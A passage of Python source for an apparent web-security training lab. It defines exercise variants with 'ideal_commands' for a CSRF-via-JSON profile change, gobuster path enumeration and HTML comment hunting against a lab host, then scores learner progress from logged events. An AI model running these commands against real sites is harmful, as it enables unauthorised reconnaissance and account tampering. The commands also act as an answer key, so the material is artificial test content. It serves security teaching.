            "techniques":  ["content-type-confusion", "json-body"],
            "tasks": [
                {"title": "Login",
                 "event_types": ["login_success"], "min_count": 1,
                 "explain": "Standard auth."},
                {"title": "Submit profile-update as application/json",
                 "event_types": ["profile_update_used"], "min_count": 1,
                 "explain": "curl -H 'Content-Type: application/json' -d '{\"email\":\"pwned@evil.lab\"}'"},
                {"title": "Confirm the change persisted",
                 "event_types": ["profile_changed_without_csrf"],
                 "explain": "Read profile back — confirm the JSON body was accepted."},
            ],
            "success_event_types": ["profile_changed_without_csrf"],
            "ideal_commands": [
                "curl -c /tmp/c.txt -s -X POST http://target-agent/auth/login -d 'username=admin&password=password123' >/dev/null",
                "curl -b /tmp/c.txt -s -X POST http://target-agent/profile/update \\",
                "     -H 'Content-Type: application/json' \\",
                "     -d '{\"email\":\"pwned@evil.lab\"}'",
            ],
        },
    },

    # ─── RECON ──────────────────────────────────────────────────────────
    "recon": {
        "manual": {
            "name":        "Manual Walking",
            "description": "Click through the portal and read what you find. Easy entry-level recon.",
            "difficulty":  "Easy",
            "techniques":  ["manual-browsing", "html-inspection"],
            "tasks": [
                {"title": "Visit the portal home",
                 "event_types": ["portal_visited"], "min_count": 1,
                 "explain": "GET /"},
                {"title": "Visit at least 3 application areas",
                 "event_types": ["route_discovered", "search_used", "diagnostics_used", "file_viewer_used", "file_upload_used", "profile_update_used"],
                 "min_count": 3,
                 "explain": "Walk through the obvious links from the home page."},
                {"title": "Trigger the recon-sequence detector",
                 "event_types": ["recon_sequence_observed"],
                 "explain": "4+ distinct areas visited fires this synthetic event."},
            ],
            "success_event_types": ["recon_sequence_observed"],
            "ideal_commands": [
                "curl -s http://target-agent/ | head -30",
                "curl -s http://target-agent/auth/login >/dev/null",
                "curl -s http://target-agent/search?q=test >/dev/null",
                "curl -s http://target-agent/profile/ >/dev/null",
                "curl -s http://target-agent/files/read?path=readme.txt >/dev/null",
            ],
        },
        "wordlist": {
            "name":        "Wordlist Enumeration",
            "description": "Use gobuster/ffuf to discover hidden paths not on the home page.",
            "difficulty":  "Medium",
            "techniques":  ["wordlist", "gobuster", "directory-brute"],
            "tasks": [
                {"title": "Confirm the target responds",
                 "event_types": ["portal_visited"], "min_count": 1,
                 "explain": "curl -i http://target-agent/"},
                {"title": "Enumerate 4+ endpoints with a wordlist",
                 "event_types": ["route_discovered", "search_used", "diagnostics_used", "file_viewer_used", "file_upload_used", "profile_update_used"],
                 "min_count": 4,
                 "explain": "Run gobuster against the host with common.txt."},
                {"title": "Find a hidden route or clue",
                 "event_types": ["hidden_clue_accessed", "csrf_lure_visited"],
                 "explain": "Wordlist finds /evil/csrf-demo or /robots.txt."},
            ],
            "success_event_types": ["recon_sequence_observed"],
            "ideal_commands": [
                "gobuster dir -u http://target-agent -w /usr/share/wordlists/dirb/common.txt -t 20 -q",
                "# Then GET each discovered path",
                "for p in /search /system/ping /files/read /profile/ /evil/csrf-demo; do",
                "  curl -s -o /dev/null -w '%{http_code} '$p'\\n' http://target-agent$p",
                "done",
            ],
        },
        "comment_hunting": {
            "name":        "HTML Comment Hunting",
            "description": "Read source HTML/JS for developer mistakes — comments, version banners.",
            "difficulty":  "Hard",
            "techniques":  ["html-comment-grep", "version-disclosure"],
            "tasks": [
                {"title": "Fetch the portal home",
                 "event_types": ["portal_visited"], "min_count": 1,
                 "explain": "curl -s http://target-agent/"},
                {"title": "Grep for comments and version banners",
                 "event_types": ["route_discovered", "search_used", "diagnostics_used", "file_viewer_used", "profile_update_used"],
                 "min_count": 2,
                 "explain": "curl -s ... | grep -E '<!--|Server:|version'"},
                {"title": "Discover a hidden clue",
                 "event_types": ["hidden_clue_accessed", "csrf_lure_visited"],
                 "explain": "Comments often leak admin URLs or framework versions."},
            ],
            "success_event_types": ["recon_sequence_observed"],
            "ideal_commands": [
                "curl -s http://target-agent/ | grep -E '<!--|Server|Framework|version' -i",
                "curl -s http://target-agent/ | grep -oE 'href=\"[^\"]+\"' | sort -u",
                "curl -sI http://target-agent/ | grep -i 'server\\|x-'",
            ],
        },
    },
}


def get_variant_spec(module_id: str, variant_id: Optional[str]) -> Optional[Dict[str, Any]]:
    """Return the variant entry for (module, variant) or None if unknown."""
    variants = MODULE_VARIANTS.get(module_id)
    if not variants:
        return None
    if not variant_id:
        # First variant is the default
        variant_id = next(iter(variants))
    return variants.get(variant_id)


def list_variants(module_id: str) -> List[Dict[str, Any]]:
    """Return a list of (id + metadata) for the module's variants — used by the UI picker."""
    variants = MODULE_VARIANTS.get(module_id, {})
    return [
        {
            "variant_id":  vid,
            "name":        v["name"],
            "description": v["description"],
            "difficulty":  v.get("difficulty", "Medium"),
            "techniques":  v.get("techniques", []),
        }
        for vid, v in variants.items()
    ]


def compute(module_id: str,
            mission_started_at: float,
            session_completed_steps: Optional[List[int]] = None,
            mode: str = "tutorial",
            variant_id: Optional[str] = None,
            ) -> Dict[str, Any]:
    """
    Returns a learner-facing progress payload:
        {
          module_id, mode, variant_id, progress_percent, completed_tasks: [int],
          tasks: [...with .complete + .matched_events],
          evidence: [card],
          success: bool,
          learner_message, defensive_insight,
        }

    `mode` selects evidence-channel gating:
      - "tutorial" → counts evidence from any channel (browser, attackbox, …)
      - "lab"      → only counts evidence with via="attackbox".

    `variant_id` selects the specific attack flavour (e.g. "password_spray",
    "credential_stuffing", "hydra_targeted" for brute_force).  When set, the
    variant's tasks REPLACE the module's default ladder, and the variant's
    success_event_types REPLACE the default success criteria.  When omitted
    the legacy default ladder is used.

    Legacy values "guided" and "operator" are normalised to "tutorial"/"lab".
    """
    # Normalise legacy mode names
    if mode == "guided":
        mode = "tutorial"
    elif mode == "operator":
        mode = "lab"
    if mode not in ("tutorial", "lab"):
        mode = "tutorial"

    spec = PROGRESS_SPECS.get(module_id)
    if not spec:
        return {
            "module_id": module_id,
            "mode": mode,
            "variant_id": variant_id,
            "progress_percent": 0,
            "completed_tasks": [],
            "tasks": [],
            "evidence": [],
            "success": False,
            "learner_message": f"No progress specification for module {module_id!r}.",
            "defensive_insight": None,
        }

    # ─── Resolve variant ────────────────────────────────────────────────
    # If a known variant is supplied, its tasks replace the default ladder
    # and its success_event_types replace the default success criteria.
    variant = get_variant_spec(module_id, variant_id)
    is_lab = (mode == "lab")

    if variant is not None:
        task_ladder = variant["tasks"]
        variant_id_out = variant_id or next(iter(MODULE_VARIANTS.get(module_id, {})), None)
    else:
        # Legacy path — use the module's default tasks_lab / tasks_tutorial
        task_ladder = (
            spec.get("tasks_lab") if is_lab else None
        ) or spec.get("tasks_tutorial", spec.get("tasks", []))
        variant_id_out = None

    # Fetch ALL events since mission start — do NOT filter by module_id here.
    # Cross-module events (e.g. search_used is tagged 'xss' but counts for recon
    # task 2) must be visible. Task-level event_type matching below handles scoping.
    raw_events = fetch_events(since=mission_started_at, limit=500)

    # Lab mode: only count evidence that came through the AttackBox.
    # Browser-driven events still appear in cards (so the learner can see what
    # they did) but they are NOT counted toward task completion.
    if is_lab:
        events_for_progress = [e for e in raw_events if e.get("via") == "attackbox"]
    else:
        events_for_progress = raw_events

    # Build task results
    tasks_out = []
    completed_idx: List[int] = []
    for idx, t in enumerate(task_ladder):
        wanted_types = set(t["event_types"])
        matches = [e for e in events_for_progress if e.get("event_type") in wanted_types]
        min_count = t.get("min_count", 1)
        complete = len(matches) >= min_count
        if complete:
            completed_idx.append(idx)
        tasks_out.append({
            "title":          t["title"],
            "explain":        t.get("explain"),
            "complete":       complete,
            "match_count":    len(matches),
            "min_count":      min_count,
            "event_types":    t["event_types"],
        })

    # Gather all event_types referenced in this ladder so evidence cards
    # stay scoped to the current module (no cross-module noise in the panel).
    spec_event_types: set = set()
    for t in task_ladder:
        spec_event_types.update(t["event_types"])

    # Success criteria: variant overrides default
    if variant is not None:
        variant_success = set(variant.get("success_event_types") or [])
        spec_event_types.update(variant_success)
        success_required = variant_success
    else:
        success_key = "success_lab" if is_lab and spec.get("success_lab") else "success_tutorial"
        spec_event_types.update(spec.get(success_key) or [])
        success_required = set(spec.get(success_key) or [])

    # Build evidence cards (one per event_type, keep latest occurrence).
    # We use raw_events here (not the gated set) so a learner who clicked
    # in the browser still sees their actions — they just don't count.
    seen_types: set = set()
    cards: List[Dict[str, Any]] = []
    for e in reversed(raw_events):
        et = e.get("event_type")
        if et not in spec_event_types:   # skip events unrelated to this module
            continue
        if et in seen_types:
            continue
        seen_types.add(et)
        cards.append({
            "title":       _evidence_title(et),
            "description": e.get("learner_message") or "",
            "event_type":  et,
            "timestamp":   e.get("ts"),
            "severity":    e.get("severity", "info"),
            "module_id":   e.get("module_id"),
            "via":         e.get("via", "unknown"),
            "counts":      (not is_lab) or (e.get("via") == "attackbox"),
            "extra":       e.get("extra", {}),
        })
    cards.sort(key=lambda c: c.get("timestamp") or 0, reverse=True)

    # ── Append tool evidence from Lab Mode ──────────────────────────────────
    # If the learner used the AttackBox terminal, those commands are recorded
    # in operator_api. Merge them into evidence cards so Check Progress shows
    # a unified view of all learner activity.
    try:
        from backend import operator_api
        tool_events = operator_api.get_tool_evidence(since=mission_started_at)
        for te in tool_events:
            # Filter by module_id if the tool command was tagged
            if te.get("module_id") and te["module_id"] != module_id:
                continue
            cards.append({
                "title":       _evidence_title(te.get("event_type", "tool_command_observed")),
                "description": te.get("learner_message", ""),
                "event_type":  te.get("event_type", "tool_command_observed"),
                "timestamp":   te.get("ts"),
                "severity":    te.get("severity", "info"),
                "module_id":   te.get("module_id"),
                "via":         "attackbox",
                "counts":      True,
                "extra":       {"tool": te.get("tool"), "command": te.get("command", "")[:80]},
            })
    except ImportError:
        pass  # operator_api not available — skip tool evidence
    cards.sort(key=lambda c: c.get("timestamp") or 0, reverse=True)

    # Success: every required success event_type observed
    # (success_required was set earlier — variant override or default spec)
    success_seen     = set(e.get("event_type") for e in events_for_progress) & success_required
    success          = len(success_required) > 0 and success_seen == success_required

    progress_percent = int(round(100 * len(completed_idx) / max(len(tasks_out), 1)))

    if is_lab:
        if success:
            msg = "Lab complete! All steps were performed via Terminal/ZAP."
        elif progress_percent >= 50:
            msg = "Good lab progress. Continue with the next Terminal/ZAP step."
        elif progress_percent > 0:
            msg = "Lab mode: keep driving the attack from the Terminal or ZAP."
        else:
            msg = "Lab mode: open the Terminal or ZAP and run the Step 1 command."
    else:
        if success:
            msg = "Tutorial complete! Vulnerability demonstrated successfully."
        elif progress_percent >= 50:
            msg = "Good progress — finish the remaining task to confirm the vulnerability."
        elif progress_percent > 0:
            msg = "You're on your way. Follow the tutorial steps in the instructions panel."
        else:
            msg = "Start the mission and interact with the target environment."

    return {
        "module_id":           module_id,
        "mode":                mode,
        "variant_id":          variant_id_out,
        "variant_name":        (variant or {}).get("name"),
        "variant_difficulty":  (variant or {}).get("difficulty"),
        "progress_percent":    progress_percent,
        "completed_tasks":     completed_idx,
        "tasks":               tasks_out,
        "evidence":            cards,
        "success":             success,
        "learner_message":     msg,
        "defensive_insight":   spec.get("defensive_insight"),
        "events_examined":     len(raw_events),
    }


def _evidence_title(event_type: Optional[str]) -> str:
    titles = {
        "portal_visited":              "Portal visited",
        "route_discovered":            "Route discovered",
        "hidden_clue_accessed":        "Hidden clue accessed",
        "login_failed":                "Failed login observed",
        "login_success":               "Successful login observed",
        "brute_force_pattern":         "Brute-force pattern detected",
        "credential_found":            "Valid credential confirmed",
        "search_used":                 "Search feature used",
        "xss_payload_observed":        "XSS-shaped payload submitted",
        "reflected_input_detected":    "Reflected input observed",
        "diagnostics_used":            "Diagnostics form used",
        "command_separator_observed":  "Shell metacharacters observed",
        "command_injection_detected":  "Command injection confirmed",
        "file_viewer_used":            "File viewer used",
        "traversal_pattern_observed":  "Path traversal observed",
        "sensitive_file_disclosed":    "Sensitive file disclosed",
        "file_upload_used":            "File upload form used",
        "file_saved":                  "File saved on the server",
        "dangerous_extension_accepted": "Dangerous extension accepted",
        "unrestricted_upload_detected": "Unrestricted upload confirmed",
        "profile_update_used":         "Profile update used",
        "csrf_token_missing":          "Profile update without a CSRF token",
        "csrf_lure_visited":           "Attacker lure page visited",
        "csrf_lure_submitted":         "Forged form submitted from lure page",
        "profile_changed_without_csrf": "Profile changed without CSRF protection",
        "tool_command_observed":       "Lab tool command executed",
        "recon_sequence_observed":     "Recon sequence detected",
    }
    return titles.get(event_type or "", str(event_type or "unknown"))
